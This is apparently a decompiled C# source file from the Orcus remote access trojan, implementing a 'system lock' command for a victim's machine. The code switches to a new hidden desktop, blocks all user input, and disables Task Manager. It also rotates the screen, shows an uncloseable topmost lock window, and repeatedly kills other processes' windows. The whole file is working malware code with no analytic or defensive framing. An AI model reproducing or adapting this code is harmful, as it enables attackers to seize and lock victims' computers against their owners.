using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Orcus.Commands.FunActions;
using Orcus.Native;
using Orcus.Plugins;
using Orcus.Plugins.StaticCommands;
using Orcus.StaticCommands.System;
using Orcus.StaticCommands.SystemLock;
using Orcus.Utilities;
using Orcus.Utilities.WindowsDesktop;

namespace Orcus.StaticCommands;

public class SystemLockCommandEx : SystemLockCommand
{
	private Desktop _desktop;

	private Timer _closeWindowsTimer;

	private readonly TimeSpan _closeWindowsInterval = TimeSpan.FromSeconds(1.0);

	private SystemLockForm _lockForm;

	public override void StartExecute(CommandParameter commandParameter, IClientInfo clientInfo)
	{
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f1: Unknown result type (might be due to invalid IL or missing references)
		commandParameter.InitializeProperties((StaticCommand)(object)this);
		if (((SystemLockCommand)this).get_UseDifferentDesktop())
		{
			_desktop = Desktop.CreateDesktop(Guid.NewGuid().ToString("N"));
			_desktop.Show();
			Desktop.SetCurrent(_desktop);
			if (((SystemLockCommand)this).get_CloseOtherWindows())
			{
				_closeWindowsTimer = new Timer(CloseWindowsCallback, null, _closeWindowsInterval, TimeoutEx.InfiniteTimeSpan);
			}
		}
		if (((SystemLockCommand)this).get_RotateScreen() && Display.RotateAllScreens(Display.Orientations.DEGREES_CW_180) != 0)
		{
			Display.ResetAllRotations();
			((SystemLockCommand)this).set_RotateScreen(false);
		}
		_lockForm = new SystemLockForm(((SystemLockCommand)this).get_Message(), ((SystemLockCommand)this).get_PreventClosing(), ((SystemLockCommand)this).get_Background(), ((SystemLockCommand)this).get_SetToTopPeriodically(), ((SystemLockCommand)this).get_RotateScreen());
		if (((SystemLockCommand)this).get_DisableUserInput())
		{
			NativeMethods.BlockInput(fBlockIt: true);
		}
		if (((SystemLockCommand)this).get_Topmost())
		{
			((Form)_lockForm).set_TopMost(true);
		}
		if (((SystemLockCommand)this).get_DisableTaskManager())
		{
			try
			{
				WindowsModules.SetTaskManager(enable: false);
			}
			catch (Exception)
			{
			}
		}
		try
		{
			((Form)_lockForm).ShowDialog();
		}
		finally
		{
			if (((SystemLockCommand)this).get_RotateScreen())
			{
				Display.ResetAllRotations();
			}
			if (((SystemLockCommand)this).get_DisableUserInput())
			{
				NativeMethods.BlockInput(fBlockIt: false);
			}
			if (((SystemLockCommand)this).get_DisableTaskManager())
			{
				try
				{
					WindowsModules.SetTaskManager(enable: true);
				}
				catch (Exception)
				{
				}
			}
			if (_closeWindowsTimer != null)
			{
				Timer closeWindowsTimer = _closeWindowsTimer;
				_closeWindowsTimer = null;
				closeWindowsTimer.Dispose();
			}
			if (((SystemLockCommand)this).get_UseDifferentDesktop())
			{
				Desktop.Default.Show();
				_desktop.Dispose();
			}
		}
	}

	public override void StopExecute()
	{
		((ActiveStaticCommand)this).StopExecute();
		_lockForm?.SafeClose();
	}

	private void CloseWindowsCallback(object state)
	{
		Desktop.SetCurrent(_desktop);
		try
		{
			List<Window> windows = _desktop.GetWindows();
			int id = Process.GetCurrentProcess().Id;
			foreach (Window item in windows)
			{
				NativeMethods.GetWindowThreadProcessId(item.Handle, out var lpdwProcessId);
				if (lpdwProcessId != id)
				{
					NativeMethods.PostMessage(new HandleRef(null, item.Handle), WM.CLOSE, IntPtr.Zero, IntPtr.Zero);
					try
					{
						Process.GetProcessById((int)lpdwProcessId).Kill();
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception)
		{
		}
		if (((ActiveStaticCommand)this).get_IsActive())
		{
			_closeWindowsTimer?.Change(_closeWindowsInterval, TimeoutEx.InfiniteTimeSpan);
		}
	}
}
